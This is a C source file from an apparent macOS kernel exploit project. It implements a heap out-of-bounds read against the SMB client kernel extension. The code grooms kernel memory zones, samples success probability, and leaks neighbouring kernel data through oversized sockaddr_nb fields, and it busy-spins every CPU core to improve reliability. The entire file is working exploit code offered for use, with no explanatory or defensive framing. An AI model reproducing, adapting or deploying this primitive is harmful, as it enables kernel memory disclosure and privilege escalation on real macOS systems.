//
//  neighbor_reader.c
//  kmem_xepg
//
//  Created by admin on 12/20/21.
//

#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <libproc.h>

#include <sys/un.h>
#include <sys/errno.h>
#include <dispatch/dispatch.h>

#include <xe/util/log.h>
#include <xe/util/assert.h>
#include <xe/util/dispatch.h>
#include <xe/util/binary.h>
#include <xe/util/misc.h>

#include "zkext_neighbor_reader.h"
#include "kmem_oob_reader.h"
#include "allocator_nrnw.h"
#include <macos/macos.h>

#include "../smb/client.h"

#define MAX_TRIES 25

#define NUM_SAMPLES_FOR_PROBABILITY 100
#define CUTOFF_PROBABILITY 0.95
#define NUM_KEXT_64_PAD_START_PAGES 16
#define NUM_KEXT_64_ELEMENTS_PER_GAP 7
#define NUM_KEXT_64_READ_SLOTS (XE_PAGE_SIZE / 64 * 64)
#define NUM_KEXT_64_FRAGMENTED_PAGES 64
#define NUM_KEXT_64_PAD_END_PAGES 8

#define KMEM_ZKEXT_NB_ENABLE_CPU_DOS TRUE


kmem_allocator_nrnw_t kmem_zkext_neighbor_reader_prepare(const struct sockaddr_in* smb_addr) {
    kmem_allocator_nrnw_t gap_allocator = kmem_allocator_nrnw_create(smb_addr);
    kmem_allocator_nrnw_t element_allocator = kmem_allocator_nrnw_create(smb_addr);
    
    kmem_allocator_nrnw_allocate(element_allocator, 64, NUM_KEXT_64_PAD_START_PAGES * XE_PAGE_SIZE / 64);
    for (int i=0; i<NUM_KEXT_64_READ_SLOTS; i++) {
        kmem_allocator_nrnw_allocate(gap_allocator, 64, 1);
        kmem_allocator_nrnw_allocate(element_allocator, 64, NUM_KEXT_64_ELEMENTS_PER_GAP);
    }
    kmem_allocator_nrnw_allocate(element_allocator, 64, NUM_KEXT_64_PAD_END_PAGES * XE_PAGE_SIZE / 64);
    
    kmem_allocator_nrnw_destroy(&gap_allocator);
    return element_allocator;
}


double kmem_zkext_neighbor_reader_check(const struct sockaddr_in* smb_addr, uint8_t zone_size, uint8_t addr_len) {
    int num_overwritten = ((int)addr_len - 1) / 64;
    int total_size = (num_overwritten + 1) * 64;
    uint8_t to_read = total_size - offsetof(struct sockaddr_nb, snb_name) - 6;
    xe_assert_cond(total_size, <=, UINT8_MAX);
    
    uint32_t* local_nb_name_size = alloca(sizeof(uint32_t));
    *local_nb_name_size = 2048;
    char* local_nb_name = malloc(*local_nb_name_size);
    int num_hits = 0;
    
    for (int i=0; i<NUM_SAMPLES_FOR_PROBABILITY; i++) {
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        
        dispatch_async(xe_dispatch_queue(), ^() {
            struct kmem_oob_reader_args params;
            params.smb_addr = *smb_addr;
            params.saddr_snb_len = sizeof(struct sockaddr_nb);
            params.saddr_ioc_len = sizeof(struct sockaddr_nb);
            params.saddr_snb_name_seglen = 3;
            static_assert(sizeof(struct sockaddr_nb) > 48 && sizeof(struct sockaddr_nb) <= 64, "");
            params.laddr_snb_len = 64;
            params.laddr_ioc_len = zone_size;
            params.laddr_snb_name_seglen = to_read;
            
            kmem_oob_reader_read(&params, NULL, NULL, local_nb_name, local_nb_name_size);
            dispatch_semaphore_signal(sem);
        });
        
        if (dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 3 * 1000000000ULL))) {
            xe_log_warn("kmem neighbor read timed out");
            continue;
        }
        
        xe_assert_cond(*local_nb_name_size, >=, to_read + 1);
        
        uint8_t first_segment_size = local_nb_name[0];
        xe_assert_cond(first_segment_size, ==, to_read);
        
        int bytes_to_skip = 64 - offsetof(struct sockaddr_nb, snb_name);
        
        _Bool is_hit = TRUE;
        for (int i=0; i<num_overwritten; i++) {
            struct sockaddr_in in;
            memcpy(&in, &local_nb_name[bytes_to_skip + i * 64], sizeof(struct sockaddr_in));
            if (in.sin_len != 64 || in.sin_family != ALLOCATOR_NRNW_SOCK_ADDR_FAMILY || in.sin_port != ALLOCATOR_NRNW_SOCK_ADDR_PORT) {
                is_hit = FALSE;
                break;
            }
        }
        
        if (is_hit) {
            num_hits++;
        }
    }
    
    free(local_nb_name);
    return (double)num_hits / (double)NUM_SAMPLES_FOR_PROBABILITY;
}

int kmem_zkext_neighbor_reader_read_internal(const struct sockaddr_in* smb_addr, uint8_t zone_size, char* data, size_t data_size) {
    xe_assert_cond(data_size, <=, zone_size);
//    xe_assert_cond(zone_size, >=, 64);
    xe_assert_cond(zone_size, <, 128);
    
    kmem_allocator_nrnw_t element_allocator = kmem_zkext_neighbor_reader_prepare(smb_addr);
    
    int error = EAGAIN;
    for (int i=0; i<MAX_TRIES; i++) {
        double probability = kmem_zkext_neighbor_reader_check(smb_addr, zone_size, zone_size * 2);
        if (probability < CUTOFF_PROBABILITY) {
            xe_log_debug("skipping read due to low success probability of %.2f", probability);
            continue;
        }
        
        uint32_t local_nb_name_size = 2048;
        char* local_nb_name = malloc(local_nb_name_size);
                
        uint8_t snb_name_seglen = zone_size + zone_size - offsetof(struct sockaddr_nb, snb_name) + 2;
        
        struct kmem_oob_reader_args params;
        params.smb_addr = *smb_addr;
        params.saddr_snb_len = sizeof(struct sockaddr_nb);
        params.saddr_ioc_len = sizeof(struct sockaddr_nb);
        params.saddr_snb_name_seglen = 3;
        params.laddr_snb_len = zone_size * 2;
        params.laddr_ioc_len = zone_size;
        params.laddr_snb_name_seglen = snb_name_seglen;
        
        kmem_oob_reader_read(&params, NULL, NULL, local_nb_name, &local_nb_name_size);
        
        xe_assert_cond(local_nb_name_size, >=, snb_name_seglen);
        
        uint8_t first_segment_len = local_nb_name[0];
        xe_assert_cond(first_segment_len, ==, snb_name_seglen);
        
        int bytes_to_skip = zone_size - offsetof(struct sockaddr_nb, snb_name);
        xe_log_debug_hexdump(&local_nb_name[bytes_to_skip], data_size, "neighbor data: ");
        memcpy(data, &local_nb_name[bytes_to_skip], data_size);
        
        free(local_nb_name);
        error = 0;
        break;
    }
    
    kmem_allocator_nrnw_destroy(&element_allocator);
    return error;
}

int kmem_zkext_neighbor_reader_read(const struct sockaddr_in* smb_addr, uint8_t zone_size, char* data, size_t data_size) {
#if defined(KMEM_ZKEXT_NB_ENABLE_CPU_DOS)
    dispatch_queue_t queue = dispatch_queue_create("reader", dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_CONCURRENT, QOS_CLASS_USER_INTERACTIVE, DISPATCH_QUEUE_PRIORITY_HIGH));

    volatile _Bool* stop = alloca(sizeof(_Bool));
    *stop = FALSE;
    int* res = alloca(sizeof(int));
    dispatch_apply(xe_cpu_count(), queue, ^(size_t index) {
        if (index == 0) {
            xe_sleep_ms(10);
            *res = kmem_zkext_neighbor_reader_read_internal(smb_addr, zone_size, data, data_size);
            *stop = TRUE;
        } else {
            while (!*stop) {}
        }
    });

    dispatch_release(queue);
    return *res;
#else
    return kmem_zkext_neighbor_reader_read_internal(smb_addr, zone_size, data, data_size);
#endif
}

